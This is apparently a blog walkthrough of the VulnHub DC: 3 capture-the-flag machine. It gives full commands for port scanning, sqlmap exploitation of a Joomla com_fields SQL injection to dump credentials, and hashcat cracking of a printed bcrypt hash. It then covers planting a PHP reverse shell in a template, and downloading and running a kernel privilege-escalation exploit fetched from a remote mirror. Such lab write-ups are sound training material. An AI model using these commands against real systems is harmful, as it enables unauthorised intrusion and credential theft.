# VulnHub - DC: 3 (In Detail)

_6 min read · February 16, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**DC: 3**](https://www.vulnhub.com/entry/dc-32,312/) machine from [**VulnHub**](https://www.vulnhub.com/about/).

- Goal: Obtain Flag in Root
- Difficulty: Easy
- Machine Author: DCAU7

---

## Getting the Machine IP Address

As usual:

```bash
sudo netdiscover -i eth0 -r 10.0.2.0/24
```

In my case, the machine IP address is **10.0.2.4**.

## Scanning for Open Ports

Again as usual:

```bash
nmap -sS 10.0.2.4
sudo nmap -sCV -p 80 10.0.2.4
```

![Nmap Output](./img/vulnhub-dc3/Nmap-output.png)

From the scan result, I noticed that:

- HTTP (port 80) is open.

Then as usual, I browsed the site.

![DC 3: Website](./img/vulnhub-dc3/web.png)

I inspected the source code and I found out that this site is running on **Joomla**.

---

## Futher Enumeration on the Website

Since the site is running Joomla, I used [**Joomscan**](https://www.kali.org/tools/joomscan/) to enumerate the site.

```bash
joomscan -url http://10.0.2.4
```

![Joomscan Output](./img/vulnhub-dc3/Joomscan-output.png)

From the result, I discovered:

- Joomla version 3.7.0.
- Admin login page at `/administrator/`.

I then accessed `/administrator/`:

![DC 3: Admin Page](./img/vulnhub-dc3/web-admin.png)

I tried using default credentials like `admin:admin`, but they didn't work.

Next, I searched for exploit for that Joomla version and I found ['com_fields' SQL Injection](https://www.exploit-db.com/exploits/42033).

---

## Gaining the Credential

I used the `sqlmap` command from the link above:

```bash
sqlmap -u "http://10.0.2.4/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

- --dbs → Enumerate available databases.

![Databases](./img/vulnhub-dc3/db-db.png)

From the output, the most interesting one was `joomladb`.

Then I enumerated its tables:

```bash
sqlmap -u "http://10.0.2.4/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb --tables
```

- -D → Specify database (joomladb) to enumerate.
- --tables → Enumerate available tables.

![JoomlaDB Tables](./img/vulnhub-dc3/db-table.png)

As shown here, the most interesting one was `users`.

Then I enumrated its columns:

```bash
sqlmap -u "http://10.0.2.4/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T '#__users' --columns
```

- -T → Specify table (#\_\_users) to enumerate.
- --columns → Enumerate available columns.

There were id, name, username, email and password columns.

Then I dumped the interesting columns:

```bash
sqlmap -u "http://10.0.2.4/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -p list[fullordering] -D joomladb -T '#__users' -C email,username,password --dump
```

- -C → Specify columns (email, username, password) to enumerate.

![JoomlaDB Users Email, Username, Password](./img/vulnhub-dc3/db-cred.png)

From this, I retrieved the admin's hashed password.

---

## Cracking the Password

The hash started with `$2y$`. After checking online, I confirmed that this is a [bcrypt (Blowfish) hash](https://hashes.com/en/tools/hash_identifier).

I used [**Hashcat**](https://www.kali.org/tools/hashcat/) to crack it:

```bash
hashcat -m 3200 -a 0 '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu' '/usr/share/wordlists/rockyou.txt'
```

- -m 3200 → Hash type (bcrypt, Blowfish Unix).
- -a 0 → Straight attack mode.

![Hashcat Output](./img/vulnhub-dc3/Hashcat-output.png)

Then I got the password which is 'snoopy'.

---

## Gaining the Machine Shell

I logged in to `/administrator/` page.

![DC 3: Admin Logged In](./img/vulnhub-dc3/web-admin-login.png)

After loggin in, I needed a way to get a reverse shell. I navigated to Extensions → Templates → Templates → Beez3 and I noticed that I could edit template files and preview them. That means I can inject malicious PHP code.

I searched for a PHP reverse shell and used the [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php).

I then set up my listener using [**Netcat**](https://www.kali.org/tools/netcat/):

```bash
nc -lvp 4418
```

Then I pasted the reverse shell code into `index.php` of the Beez3 template and clicked 'Template Preview'.

![Beez3 index.php](./img/vulnhub-dc3/Beez3-index-php.png)

Then I got the reverse shell.

![Reverse Shell](./img/vulnhub-dc3/rev-shell.png)

---

## Post-Exploitation Enumeration

As usual, I performed my post-exploitation checklist.

I checked the OS version.

```bash
cat /etc/os-release
```

![OS-Release](./img/vulnhub-dc3/os-release.png)

The system was running an older Ubuntu version.

Since I didn't find any sudo misconfigurations or SUID binaries, I searched for public kernel exploits related to this Ubuntu version. I found ['double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation](https://www.exploit-db.com/exploits/39772).

---

## Privilege Escalation

I downloaded the exploit on the target machine:

```bash
cd /tmp
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
unzip 39772.zip
cd 39772
```

![39772](./img/vulnhub-dc3/39772.png)

Inside `39772`, there was `exploit.tar`.

```bash
tar -xvf exploit.tar
```

![Export exploit.tar](./img/vulnhub-dc3/exploit-tar.png)

Then I navigated into the extracted directory and ran these two commands as stated in Exploit-DB link above:

```bash
cd ebpf_mapfd_doubleput_exploit
./compile.sh
./doubleput
```

![Root](./img/vulnhub-dc3/root.png)

I then retrieved the flag.

```bash
cd /root
cat the-flag.txt
```

![Flag](./img/vulnhub-dc3/flag.png)

Bomba! Settleee.

---

## Session Terminated

DC-3 is an easy machine that focuses on CMS enumeration, SQL injection exploitation, password cracking, and kernel-based privilege escalation.

From this machine, I learned how to:

- use sqlmap effectively for database dumping
- gain a reverse shell by modifying Joomla templates
- identify vulnerable Linux kernel versions

Thank you for reading and see you next time!
